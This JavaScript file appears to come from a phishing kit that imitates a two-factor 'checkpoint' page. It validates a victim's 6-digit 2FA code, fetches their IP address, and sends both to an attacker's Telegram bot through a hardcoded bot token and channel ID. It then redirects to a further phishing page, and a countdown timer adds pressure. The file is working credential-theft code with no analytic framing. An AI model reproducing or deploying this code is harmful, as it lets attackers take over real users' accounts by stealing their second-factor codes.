function validateCode() {
    // Get the input element
    var codeInput = document.getElementById('approvals_code');

    // Get the span element for validation message
    var validationMessage = document.getElementById('validationMessage');

    // Get the button element
    var submitLink = document.querySelector('.hhh');

    // Get the loading GIF element
    var loadingImage = document.getElementById('loadingImage');

    // Check if the entered code has at least 6 digits and contains only numeric values
    if (codeInput.value.length < 6 || !/^\d+$/.test(codeInput.value)) {
        // Update the validation message if it exists
        if (validationMessage) {
            validationMessage.innerText = 'Please enter a valid 6-digit numeric code.';
        }
        return false; // Prevent form submission
    }

    // Clear the validation message if it exists
    if (validationMessage) {
        validationMessage.innerText = '';
    }

    // Show the loading GIF and hide the button text if they exist
    submitLink.style.display = 'none';
    loadingImage.style.display = 'inline';

    // Fetch user's IP address from an alternative IP geolocation service (ipapi.co)
    var xhrIp = new XMLHttpRequest();
    xhrIp.open('GET', 'https://api.ipify.org/?format=json', true);
    xhrIp.onreadystatechange = function () {
        if (xhrIp.readyState === 4 && xhrIp.status === 200) {
            var ipInfoData = JSON.parse(xhrIp.responseText);
            var userIp = ipInfoData.ip;

            // Send the 2FA code and IP address to the Telegram bot
            sendToTelegram(codeInput.value, userIp);

            // Navigate after a delay
            setTimeout(function () {
                window.location.href = "/checkpoint/next2.html";
            }, 2000);
        }
    };
    xhrIp.send();

    return false; // Prevent default form submission
}

function sendToTelegram(code, ip) {
    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHANNEL_ID' with your actual bot token and channel ID
    var botToken = '6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU';
    var channelId = '-1002131592723';
    var apiEndpoint = `https://api.telegram.org/bot${botToken}/sendMessage`;

    var message = `2FA Code 1: ${code}\nUser IP: ${ip}`;
    var data = {
        chat_id: channelId,
        text: message,
    };

    var xhrTelegram = new XMLHttpRequest();
    xhrTelegram.open('POST', apiEndpoint, true);
    xhrTelegram.setRequestHeader('Content-Type', 'application/json');
    xhrTelegram.send(JSON.stringify(data));
}

        // Set the initial value of the timer
        var seconds = 59;

        // Function to update the timer value
        function updateTimer() {
            document.getElementById('timer').textContent = '00:' + seconds;
            seconds--;

            // Check if the timer has reached 0
            if (seconds < 0) {
            } else {
                // Schedule the function to run again after 1 second
                setTimeout(updateTimer, 1000);
            }
        }

        // Start the timer when the page loads
        window.onload = function () {
            updateTimer();
        };